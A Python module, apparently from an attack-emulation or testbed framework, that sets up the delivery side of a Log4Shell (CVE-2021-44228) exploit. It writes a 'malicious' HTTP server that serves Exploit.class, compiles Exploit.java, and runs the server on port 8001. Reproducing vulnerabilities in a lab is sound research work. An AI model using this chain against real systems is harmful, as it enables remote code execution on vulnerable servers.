import os, sys, logging
import pathlib
fpath = pathlib.Path(__file__).parent.resolve()
root_directory = os.path.abspath("{}/..".format(fpath))
from applications.application import Application

class Cve202144228HttpServer(Application):
    def __init__(self, app, **params):
        name = params.get("name", app)
        super().__init__(app, name)

    # Please revise the following functions if it is different
    # from the default way
    def check_application(self, arch=None, os=None):
        logging.debug("Check the application: {}".format(self.app))
        cmds = []
        # if arch == "aarch64" and os == "debian":
        #     cmd = "which nmap"
        #     cmds.append(cmd)
        return cmds

    def prepare_application(self, arch=None, os=None):
        logging.debug("Prepare the application: {}".format(self.app))
        cmds = []

        cmd = "cat <<EOF > malicious_http_server.py\nimport logging\nimport sys\nfrom http.server import SimpleHTTPRequestHandler, HTTPServer\nimport os\n\nlogging.basicConfig(level=logging.INFO)\n\nclass MaliciousRequestHandler(SimpleHTTPRequestHandler):\n\tdef do_GET(self):\n\t\t# Log every incoming request\n\t\tlogging.info(f\"Received request for {self.path}\")\n\n\t\t# Serve the Exploit.class directly if requested\n\t\tif self.path.endswith(\".class\"):\n\t\t\tself.path = self.path.lstrip(\'/\')\n\t\t\tif os.path.exists(self.path):\n\t\t\t\tself.send_response(200)\n\t\t\t\tself.send_header(\'Content-type\', \'application/java-vm\')\n\t\t\t\tself.end_headers()\n\t\t\t\twith open(self.path, \'rb\') as file:\n\t\t\t\t\tcontent = file.read()\n\t\t\t\t\tlogging.info(f\"Serving {self.path}, content size: {len(content)} bytes\")\n\t\t\t\t\tself.wfile.write(content)\n\t\t\telse:\n\t\t\t\tlogging.warning(f\"No matching resource found for {self.path}. Sending 404 response.\")\n\t\t\t\tself.send_response(404)\n\t\t\t\tself.end_headers()\n\t\telse:\n\t\t\tsuper().do_GET()\n\n\tdef log_message(self, format, *args):\n\t\t# Override to prevent the default logging (which logs to stderr)\n\t\tlogging.info(format % args)\n\nif __name__ == '__main__':\n\tif len(sys.argv) != 2:\n\t\tprint(\"Usage: python3 malicious_http_server.py <port>\")\n\t\tsys.exit(1)\n\t# Change to the directory where the .class files are stored\n\tHTTP_PORT = int(sys.argv[1])\n\tserver_address = ('0.0.0.0', HTTP_PORT)\n\thttpd = HTTPServer(server_address, MaliciousRequestHandler)\n\tlogging.info(f\"Serving malicious payload on port {HTTP_PORT}...\")\n\thttpd.serve_forever()\nEOF"
        cmds.append(cmd)

        cmd = "javac Exploit.java"
        cmds.append(cmd)
        # if arch == "aarch64" and os == "debian":
        #     cmd = "apt-get install nmap"
        #     cmds.append(cmd)
        return cmds

    def run_application(self, arch=None, os=None, **params):
        logging.debug("Run the application: {}".format(self.app))
        cmds = []

        cmd = "python3 malicious_http_server.py 8001"
        cmds.append(cmd)
        # if arch == "aarch64" and os == "debian":
        #     cmd = "nmap"
        #     cmds.append(cmd)
        return cmds

